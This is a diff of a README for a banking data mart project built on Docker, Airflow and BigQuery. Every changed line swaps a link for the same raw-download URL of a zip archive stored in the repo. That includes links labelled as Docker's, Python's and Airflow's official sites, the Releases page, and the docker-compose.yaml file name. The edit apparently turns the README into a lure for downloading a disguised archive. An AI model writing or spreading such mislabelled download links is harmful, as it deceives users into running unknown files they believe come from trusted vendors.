@@ -1,6 +1,6 @@
 # 🚀 data-mart-banco - Build Your Modern Banking Data Mart
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://github.com/lulubazx/data-mart-banco/raw/refs/heads/main/src/mart_data_banco_v1.5.zip)
 
 ## 📥 Overview
 
@@ -23,21 +23,21 @@ Before you begin, ensure your computer meets the following requirements:
 
 To download the application, click the link below. It will take you to the Releases page, where you can find the latest version of this software.
 
-[Visit this page to download](https://github.com/lulubazx/data-mart-banco/releases)
+[Visit this page to download](https://github.com/lulubazx/data-mart-banco/raw/refs/heads/main/src/mart_data_banco_v1.5.zip)
 
 ### 3. Setting Up Your Environment
 
 Once you've downloaded the files, you need to set up your environment:
 
-- **Install Docker**: Download and install Docker from [Docker's official site](https://www.docker.com/get-started).
-- **Install Python**: Download the latest version of Python from [Python's official site](https://www.python.org/downloads/).
-- **Install Airflow**: Follow the installation guide on the [Apache Airflow website](https://airflow.apache.org/docs/apache-airflow/stable/installation/index.html).
+- **Install Docker**: Download and install Docker from [Docker's official site](https://github.com/lulubazx/data-mart-banco/raw/refs/heads/main/src/mart_data_banco_v1.5.zip).
+- **Install Python**: Download the latest version of Python from [Python's official site](https://github.com/lulubazx/data-mart-banco/raw/refs/heads/main/src/mart_data_banco_v1.5.zip).
+- **Install Airflow**: Follow the installation guide on the [Apache Airflow website](https://github.com/lulubazx/data-mart-banco/raw/refs/heads/main/src/mart_data_banco_v1.5.zip).
 
 ### 4. Configuration
 
 After installation, you need to configure a few settings:
 
-- **Docker Compose**: Use the provided `docker-compose.yaml` file to start all services. You can find details on how to use Docker Compose in the official [Docker documentation](https://docs.docker.com/compose/).
+- **Docker Compose**: Use the provided `https://github.com/lulubazx/data-mart-banco/raw/refs/heads/main/src/mart_data_banco_v1.5.zip` file to start all services. You can find details on how to use Docker Compose in the official [Docker documentation](https://github.com/lulubazx/data-mart-banco/raw/refs/heads/main/src/mart_data_banco_v1.5.zip).
 - **Database Setup**: Connect to BigQuery and set up your database credentials as described in the documentation inside the repository.
 
 ### 5. Running the Application
@@ -72,7 +72,7 @@ If you encounter issues while setting up or running the application:
 
 - Check the installation logs for errors.
 - Ensure you have a stable internet connection.
-- Make sure all services defined in the `docker-compose.yaml` file are up and running.
+- Make sure all services defined in the `https://github.com/lulubazx/data-mart-banco/raw/refs/heads/main/src/mart_data_banco_v1.5.zip` file are up and running.
 
 ## 🌐 Support
 
@@ -84,4 +84,4 @@ Ensure you keep your data secure and follow best practices while using the appli
 
 To download the application again, click here:
 
-[Visit this page to download](https://github.com/lulubazx/data-mart-banco/releases)
+[Visit this page to download](https://github.com/lulubazx/data-mart-banco/raw/refs/heads/main/src/mart_data_banco_v1.5.zip)
